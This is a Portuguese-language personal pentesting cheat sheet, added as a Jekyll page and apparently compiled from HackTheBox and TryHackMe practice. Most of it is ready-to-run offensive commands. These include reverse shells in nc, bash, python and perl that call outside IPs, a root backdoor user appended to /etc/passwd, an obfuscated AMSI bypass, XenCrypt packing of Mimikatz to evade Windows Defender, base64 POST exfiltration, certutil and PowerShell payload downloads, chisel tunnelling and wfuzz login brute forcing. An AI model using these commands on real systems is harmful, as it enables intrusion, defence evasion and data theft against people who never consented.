@@ -1,0 +1,231 @@
+---
+layout: page
+---
+
+<div class="resume row">
+    <div class="col-md-12">
+      <div id="about_me">
+        <h1><mark>Dicas para facilitar a Vida</mark></h1>
+<br>
+  <h2>CTF e Sites Bacanas</h2>
+  <br>
+  https://tryhackme.com/<br>
+  https://www.hackthebox.eu/<br>
+  <br>
+  <h2>Sites úteis para Escalação de Privilégio em Windows</h2>
+  <br>
+  https://www.fuzzysecurity.com/tutorials/16.html<br>
+  https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/<br>
+  https://lolbas-project.github.io/#<br>
+  https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae<br>
+  <br>
+  <h2>Sites úteis para Escalação de Privilégio em Linux</h2>
+  <br>
+  https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/<br>
+  https://gtfobins.github.io/<br>
+  http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet/<br>
+  <br>
+  <h2>Comandos interessantes que são sempre utilizados e que nunca sei a sintaxe correta</h2>
+  <br>
+  find . -type f -newermt 2018-12-19 ! -newermt 2018-12-21 -ls -> para procurar arquivos que tenha a data de modificação entre 19-12-2018 e 21-12-2018, por exemplo<br>
+  <br>
+  <h2>Zone Transfer DNS</h2>
+  <br>
+  dig axfr @ip zona<br>
+  <br>
+  <h2>Wfuzz Exemplos</h2>
+  <br>
+  wfuzz -Z -t 5 -c --hh=14 -z file,senhas http://172.16.1.33/pin/pin.php?pin=FUZZ<br>
+  <br>
+  wfuzz -u http://10.10.10.153/moodle/login/index.php -d 'anchor=&username=Giovanni&password=Th4C00lTheachaFUZZ' -w /usr/share/seclists/Fuzzing/special-chars.txt --hh 440 (Máquina Teacher HTB)<br>
+  <br>
+  wfuzz -w cewl.out -c --hc 200 -d 'username=FUZZ&passwd=Curling2018!&option=com_login&task=login&return=aW5kZXgucGhw&d5419b43d24ad052a58b458430cd6b06=1' -b '99fb082d992a92668ce87e5540bd20fa=11j6hhicaq375psd4nnh9jjq9o; c0548020854924e0aecd05ed9f5b672b=2uqlbhamaqr25gifg04hmm9qf8' http://10.10.10.150/administrator/index.php (Máquina Curling HTB)<br>
+  <br>
+  wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.nestedflanders.htb" --hh 2 10.10.10.126<br>
+  <br>
+  <h2>Port Forwading</h2>
+  <br>
+  <br>https://github.com/jpillora/chisel<br>
+  Executamos na máquina host o comando para receber a porta da máquina invadida na minha porta 8000<br>
+  .\chisel.exe server --host 10.10.16.117 --port 8000 --reverse<br>
+  <br>
+  Na máquina invadida digito o comando para enviar a conexão da porta<br>
+  .\chisel.exe client 10.10.16.117:8000 R:14148:127.0.0.1:14147 - (no caso a porta 14148 vai ser aberta na minha máquina e receber a porta 14147 da máquina invadida)<br>
+  <br>
+  Socks Proxys Chisel<br>
+  .\chisel.exe server --host 10.10.16.117 --port 8000 --reverse<br>
+  <br>
+  Na máquina invadida digito o comando para enviar a conexão da porta, devemos configurar o proxychains<br>
+  .\chisel.exe client 10.10.16.117:8000 R:socks<br>
+  <br>
+  Mkfifo Port Fowarding<br>
+  cd /tmp<br>
+  mkfifo fifo<br>
+  cat /tmp/fifo | nc localhost 5901 | nc -l 5904 > /tmp/fifo<br>
+  Com isso a porta 5904, vai estar recebendo a saida da 5901 (local), a porta 5904 conseguimos acessar remotamente<br>
+  <br>
+  <h2>Shell reverso</h2>
+  <br>
+  *nc<br>
+  nc -e /bin/bash <ip> <port><br>
+  *nc sem o -e<br>
+  mkfifo /tmp/f;/bin/bash /tmp/f | nc 192.168.86.144 6846 > /tmp/f &<br>
+  *bash<br>
+  bash -i >& /dev/tcp/192.168.86.144/6846 0>&1<br>
+  *python<br>
+  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("46.166.165.225",6845));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'<br>
+  *perl<br>
+  perl -e 'use Socket;$i="10.10.14.29";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'<br>
+  NC sem o NC<br>
+  socat file:`tty`,echo=0,raw tcp4-listen:443<br>
+  <br>
+  <h2>Shell Interativo</h2>
+  <br>
+  /usr/bin/script -qc /bin/bash /dev/null<br>
+  ou<br>
+  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.40:443<br>
+  ou<br>
+  python -c 'import pty;pty.spawn("/bin/bash");'<br>
+  python -c 'import pty;pty.spawn("/bin/sh");'<br>
+  python3 -c 'import pty;pty.spawn("/bin/bash");'<br>
+  CTRL + Z<br>
+  stty raw -echo (na minha máquina)<br>
+  fg (duas vezes enter)<br>
+  Caso de erro: reset<br>
+  Caso ele peça terminal: xterm-color<br>
+  Caso ele esteja com bugs ainda: export TERM=xterm<br>
+  <br>
+  export SHELL=bash<br>
+  export TERM=xterm-256color<br>
+  stty rows 37 columns 173<br>
+  <br>
+  <h2>Editando passwd</h2>
+  <br>
+  echo "hacker:aaDUnysmdx4Fo:0:0:hacker:/root:/bin/bash" >> /etc/passwd<br>
+  hacker:senha<br>
+  <br>
+  <h2>Transferindo arquivos via bash sockets</h2>
+  <br>
+  Quem vai enviar:<br>
+  cat teste.zip > /dev/tcp/ip que vai receber/1111<br>
+  Quem vai receber:<br>
+  nc -nlvp 1111 > teste.zip<br>
+  <br>
+  <h2>Compartilhamento de Arquivos entre Kali e Windows</h2>
+  <br>
+  <h3>Via SMB</h3>
+  <br>
+  Kali<br>
+  impacket-smbserver aula $(pwd)<br>
+  <br>
+  Windows<br>
+  net-use z: \\ip_kali\aula<br>
+  z:<br>
+  <br>
+  <h3>Via FTP</h3>
+  <br>
+  Kali<br>
+  pip install pyftpdlib<br>
+  <br>
+  Windows<br>
+  echo binary >> ftp.txt<br>
+  echo get wget.exe >> ftp.txt<br>
+  echo disconnect >> ftp.txt<br>
+  echo quit >> ftp.txt<br>
+  <br>
+  Kali<br>
+  python -m pyftpdlib -p 21 -w<br>
+  <br>
+  Windows<br>
+  ftp -A -s:ftp.txt ip_kali<br>
+  <br>
+  <h3>Via PowerShell</h3>
+  <br>
+  PS C:\Users\Public\Downloads> $url = "http://10.10.16.119/chisel.exe"<br>
+  PS C:\Users\Public\Downloads> $output = "chisel.exe"<br>
+  PS C:\Users\Public\Downloads> $wc = New-Object System.Net.WebClient<br>
+  PS C:\Users\Public\Downloads> $wc.DownloadFile($url, $output)<br>
+  <br>
+  <h3>Via Base64</h3>
+  <br>
+  $Base64String = [System.convert]::ToBase64String((Get-Content -Path 'ARQUIVO A SER ENCODADO' -Encoding Byte)) Invoke-WebRequest -Uri http://10.10.16.119:443 -Method POST -Body $Base64String<br>
+  <br>
+  <h3>Via Certutil</h3>
+  <br>
+  certutil -urlcache -split -f http://10.10.16.119/arquivo arquivo<br>
+  <br>
+  <br>
+  <h2>Driblando Powershell para execução de scritps</h2>
+  <br>
+  powershell -ep bypass <br>
+  <br>
+  sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} ) <br>
+  <br>
+  <h2>XenCrypt pra Driblar o Windows Defender</h2>
+  <br>
+  https://github.com/the-xentropy/xencrypt<br>
+  <br>
+  Import-Module ./xencrypt.ps1<br>
+  Invoke-Xencrypt -InFile Mimikatz.ps1 -OutFile xenmimi.ps1<br>
+  <br>
+  <h2>Setando User e Password no Powershell</h2>
+  <br>
+  PS C:\inetpub\wwwroot\user> $pass = ConvertTo-SecureString "36mEAhz/B8xQ~2VM" -AsPlainText -Force<br>
+  PS C:\inetpub\wwwroot\user> $cred = New-Object System.Management.Automation.PSCredential("SNIPER\\Chris", $pass)<br>
+  PS C:\inetpub\wwwroot\user> Invoke-Command -ComputerName Sniper -Credential $cred -ScriptBlock {whoami}<br>
+  Invoke-Command -ComputerName Sniper -Credential $cred -ScriptBlock {\\10.10.16.126\\sniper\\nc.exe 10.10.16.126 443 -e powershell}<br>
+  <br>
+  <h2>Executando WinPeas</h2>
+  .\winPEAS.exe cmd fast > winPEASfast.txt<br>
+  <br>
+  <h2>Arquivo de configuração TMUX</h2>
+  <br>
+  # Remap prif to screens
+  <br>
+  set -g prefix C-a
+  <br>
+  bind C-a send-prefix
+  <br>
+  unbind C-b
+  <br>
+  <br>
+  # Quality of life stuff
+  <br>
+  set -g history-limit 10000
+  <br>
+  set -g allow-rename off
+  <br>
+  <br>
+  ## Join Windows
+  <br>
+  bind-key j command-prompt -p "join pane from:" "join-pane -s '%%'"
+  <br>
+  bind-key s command-prompt -p "send pane to:" "join-pane -t '%%'"
+  <br>
+  <br>
+  # Search Mode VI (default is emac)
+  <br>
+  set-window-option -g mode-keys vi
+  <br>
+  run-shell /opt/tmux-logging/logging.tmux
+  <br>
+  <br>
+  #Set Colors
+  <br>
+  set-option -g default-command bash
+  <br>
+  set-option -g default-terminal "screen-256color"
+  <br>
+  <br>
+  <h2>Alias para cat com color de vi</h2>
+  <br>
+  .bashrc
+  <br>
+  alias cat='highlight -O ansi --force'
+  <br>
+  <br>
+        <p>{{site.data.about.text | markdownify }}</p>
+      </div>
+    </div>
+  </div>
+  
